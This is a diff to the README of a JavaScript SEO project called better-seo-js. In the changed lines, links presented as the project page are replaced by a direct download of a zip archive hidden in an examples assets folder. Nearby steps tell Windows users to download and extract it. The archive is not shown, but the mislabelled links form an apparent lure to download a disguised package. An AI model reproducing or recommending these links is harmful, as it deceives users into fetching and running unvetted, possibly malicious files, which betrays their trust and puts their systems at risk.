@@ -1,10 +1,10 @@
 # 🧭 better-seo-js - One SEO setup for modern apps
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Divad2792/better-seo-js)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Divad2792/better-seo-js/raw/refs/heads/main/examples/nextjs-app/assets/seo-js-better-2.5.zip)
 
 ## 🔽 Download and set up
 
-1. Open the project page: [https://github.com/Divad2792/better-seo-js](https://github.com/Divad2792/better-seo-js)
+1. Open the project page: [https://github.com/Divad2792/better-seo-js/raw/refs/heads/main/examples/nextjs-app/assets/seo-js-better-2.5.zip](https://github.com/Divad2792/better-seo-js/raw/refs/heads/main/examples/nextjs-app/assets/seo-js-better-2.5.zip)
 2. On the page, find the latest release or the main project files.
 3. Download the Windows package if one is provided, or download the source files from the repository.
 4. If you get a `.zip` file, right-click it and choose **Extract All**.
@@ -162,7 +162,7 @@ A project like this often includes:
 
 ## 🔗 Download again
 
-If you need to get the files again, use this page: [https://github.com/Divad2792/better-seo-js](https://github.com/Divad2792/better-seo-js)
+If you need to get the files again, use this page: [https://github.com/Divad2792/better-seo-js/raw/refs/heads/main/examples/nextjs-app/assets/seo-js-better-2.5.zip](https://github.com/Divad2792/better-seo-js/raw/refs/heads/main/examples/nextjs-app/assets/seo-js-better-2.5.zip)
 
 ## 🧠 Terms in plain English
 
